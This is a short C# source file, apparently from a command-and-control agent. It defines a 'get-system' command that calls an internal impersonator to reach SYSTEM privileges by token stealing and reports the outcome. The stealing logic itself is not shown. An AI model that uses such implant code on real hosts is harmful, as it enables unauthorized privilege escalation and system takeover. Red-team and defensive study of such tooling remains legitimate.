using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Agent.Models;
namespace Agent.Commands
{
    public class GetSystem : AgentCommand
    {
        public override string Name => "get-system";


        public override string Execute(AgentTask task)
        {
            if (!Internal.Impersonator.ElevateToSystem())
                return "Failed to elevate to system via token-steal";
            return "Successfully impersonating SYSTEM";
        }
    }
}
